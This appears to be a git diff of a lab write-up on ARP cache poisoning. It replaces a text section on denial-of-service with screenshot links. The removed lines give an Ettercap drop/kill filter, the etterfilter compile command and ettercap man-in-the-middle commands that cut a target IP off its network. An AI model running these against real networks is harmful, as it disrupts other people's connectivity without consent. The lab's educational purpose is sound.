@@ -43,47 +43,13 @@ After we try to login with the credentials, we can see the packet being sniffed 
 
 ## 2. Perform Denial of Service (DoS) attacks using ARP Cache Poisoning attacks
 
-Ettercap has many built-in tools to allow all sorts of network activity from sniffing to ARP spoofing. It also has the ability to use filters to focus its activity. For example, we want to block a host from the network, the simplest way to do that is to not allow any packets to be sent to or from the host we wish to block. Ettercap filters allow us to do just that.
+![image](https://user-images.githubusercontent.com/67383098/227785280-253d3dad-7a57-4d1a-8713-fe4ddcfc53d6.png)
 
-#### Wrtiting a filter :
+![image](https://user-images.githubusercontent.com/67383098/227785325-9843ea75-cc93-4054-9a1b-d91a5c09750f.png)
 
-Open a text editor and type the below code . Replace the target IP as `10.0.2.5`.
+![image](https://user-images.githubusercontent.com/67383098/227786174-a01be130-3eaa-4f82-8c9e-7c9421d4f172.png)
 
-```
-if (ip.src == 'Target IP' || ip.dst == 'Target IP')
-{
-drop();
-kill();
-msg("Packet Dropped\n");
-}
-```
-> The scipt sees if the Source IP OR  the Destination IP matches our target. If it does it drops the packet and sents a RST signal to the other machine our target was > attempting to communicate with. It then outputs a message to our screen so we know a Packet Dropped.
-
-#### Compiling the script
-
-To run it and compile our script we simply type: `etterfilter dos.elt -o dos.ef`
-
-Save the file as `dos.elt` in the `/usr/local/share/ettercap`.
-
-#### Starting up ettercap
-
-`ettercap -T -q -F /usr/local/share/ettercap/dos.ef -M ARP /TARGET IP/ //`
-
-where
-
-`-T` - run in Text Mode
-`-q` - quiet mode 
-`-F` - to load a filter
-`-M` - to run a Man in the Middle Attack
-
-#### Attack
-
-`ettercap -T -q -F /usr/local/share/ettercap/dos.ef -M ARP /192.168.1.209/ //`
-
-Our target is now effectively off the network.
-
-
-
+![image](https://user-images.githubusercontent.com/67383098/227787244-41cda2ff-d2ee-475a-a283-8eda5bee6dc8.png)
 
 ## 3. Perform DNS Spoofing attack using ARP Cache Poisoning attacks
 
